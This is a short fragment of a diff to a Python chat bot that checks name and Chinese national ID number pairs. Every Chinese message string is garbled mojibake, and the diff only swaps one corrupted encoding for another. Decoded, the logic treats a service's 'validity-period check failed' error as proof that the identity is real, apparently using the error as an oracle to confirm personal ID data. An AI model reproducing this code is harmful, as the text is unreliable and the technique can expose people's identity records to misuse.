-        if status_code == 'Éí·İÖ¤ÓĞĞ§ÆÚĞ£ÑéÊ§°Ü,Çë¼ì²éĞÅÏ¢ÌîĞ´ÊÇ·ñÓĞÎó£¡':
-            hycode = f'Éí·İÖ¤ĞÅÏ¢Ğ£Ñé³É¹¦{name}---{sfz}'
+        if status_code == 'èº«ä»½è¯æœ‰æ•ˆæœŸæ ¡éªŒå¤±è´¥,è¯·æ£€æŸ¥ä¿¡æ¯å¡«å†™æ˜¯å¦æœ‰è¯¯ï¼':
+            hycode = f'èº«ä»½è¯ä¿¡æ¯æ ¡éªŒæˆåŠŸ{name}---{sfz}'
         else:
-            hycode = f'Éí·İÖ¤ĞÅÏ¢Ğ£ÑéÊ§°Ü{name}---{sfz}'
+            hycode = f'èº«ä»½è¯ä¿¡æ¯æ ¡éªŒå¤±è´¥{name}---{sfz}'
         return hycode
 
     except requests.RequestException as e:
-            hycode = f"ÇëÇóÊ§°Ü: {e} {name}---{sfz}"
+            hycode = f"è¯·æ±‚å¤±è´¥: {e} {name}---{sfz}"
     except Exception as e:
-            hycode = f"·¢Éú´íÎó: {e} {name}---{sfz}"
+            hycode = f"å‘ç”Ÿé”™è¯¯: {e} {name}---{sfz}"
     return hycode
 
 
 #-----------------------------------------------------------------------------------------------------------------------------
 
-# Æô¶¯ÂÖÑ¯
+# å¯åŠ¨è½®è¯¢
 bot.polling(non_stop=True, interval=0)
